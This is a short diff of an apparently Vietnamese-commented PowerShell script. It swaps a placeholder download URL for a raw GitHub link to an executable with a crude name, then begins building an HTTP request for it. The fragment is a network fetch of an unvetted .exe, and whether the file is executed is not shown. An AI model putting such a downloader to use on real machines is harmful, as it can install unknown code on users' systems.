@@ -1,4 +1,4 @@
-$url = "https://example.com/yourfile.exe"
+$url = "https://raw.githubusercontent.com/43a1723/test/main/Extras/fuck.exe"
 
 # Tạo một yêu cầu HTTP
 $request = [System.Net.WebRequest]::Create($url)
